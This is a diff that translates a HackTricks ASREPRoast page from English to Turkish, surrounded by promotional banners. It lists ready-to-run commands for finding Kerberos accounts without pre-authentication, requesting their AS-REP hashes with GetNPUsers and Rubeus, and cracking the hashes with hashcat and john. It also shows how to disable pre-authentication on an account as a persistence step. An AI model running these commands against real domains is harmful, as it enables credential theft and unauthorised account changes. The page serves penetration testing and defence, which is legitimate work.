@@ -2,69 +2,65 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Deneyimli hackerlar ve ödül avcılarıyla iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hacking İçgörüleri**\
+Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Gerçek Zamanlı Hack Haberleri**\
+Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**En Son Duyurular**\
+Yeni ödül avcılarının başlatıldığı ve önemli platform güncellemelerinin olduğu en son duyurularla bilgilenin
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!
 
 ## ASREPRoast
 
-ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.
+ASREPRoast, **Kerberos ön kimlik doğrulama gerekliliği** olmayan kullanıcıları hedef alan bir güvenlik saldırısıdır. Temel olarak, bu zafiyet saldırganlara kullanıcının şifresine ihtiyaç duymadan Domain Controller (DC) üzerinden kullanıcının kimlik doğrulamasını isteme imkanı sağlar. DC daha sonra kullanıcının şifreden türetilen anahtarla şifrelenmiş bir mesajla yanıt verir ve saldırganlar bu mesajı çevrimdışı olarak kırarak kullanıcının şifresini keşfetmeye çalışabilir.
 
-The main requirements for this attack are:
-- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+Bu saldırı için temel gereksinimler şunlardır:
+- **Kerberos ön kimlik doğrulama gerekliliğinin olmaması**: Hedef kullanıcıların bu güvenlik özelliğinin etkin olmaması gerekmektedir.
+- **Domain Controller (DC) ile bağlantı**: Saldırganların istek göndermek ve şifrelenmiş mesajları almak için DC'ye erişime ihtiyacı vardır.
+- **İsteğe bağlı etki alanı hesabı**: Bir etki alanı hesabı, saldırganların LDAP sorguları aracılığıyla daha verimli bir şekilde zafiyete açık kullanıcıları belirlemesine olanak tanır. Böyle bir hesap olmadan saldırganlar kullanıcı adlarını tahmin etmek zorundadır.
 
 
-#### Enumerating vulnerable users (need domain credentials)
+#### Zafiyete açık kullanıcıları sıralama (etki alanı kimlik bilgilerine ihtiyaç duyar)
 
-{% code title="Using Windows" %}
+{% code title="Windows kullanarak" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
-{% endcode %}
-
-{% code title="Using Linux" %}
+{% code title="Linux Kullanarak" %}
 ```bash
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
 {% endcode %}
 
-#### Request AS\_REP message
+#### AS\_REP mesajı isteği
 
-{% code title="Using Linux" %}
+{% code title="Linux kullanarak" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
-{% endcode %}
-
-{% code title="Using Windows" %}
+{% code title="Windows Kullanımı" %}
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
@@ -72,33 +68,29 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+Rubeus ile AS-REP Roasting yapmak, şifreleme türü 0x17 ve ön kimlik doğrulama türü 0 olan bir 4768 oluşturacaktır.
 {% endhint %}
 
-### Cracking
-
+### Kırma
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
-hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
+### Kalıcılık
 
-### Persistence
+**GenericAll** izinlerine (veya özellik yazma izinlerine) sahip olduğunuz bir kullanıcı için **preauth** zorunlu değilse:
 
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
-{% code title="Using Windows" %}
+{% code title="Windows kullanarak" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
-{% endcode %}
-
-{% code title="Using Linux" %}
+{% code title="Linux Kullanarak" %}
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
 {% endcode %}
 
-## References
+## Referanslar
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
@@ -106,29 +98,29 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hacking İçgörüleri**\
+Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Gerçek Zamanlı Hack Haberleri**\
+Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**En Son Duyurular**\
+Yeni ödül avları başlatma ve önemli platform güncellemeleri hakkında bilgi edinin
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!**
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.
 
 </details>
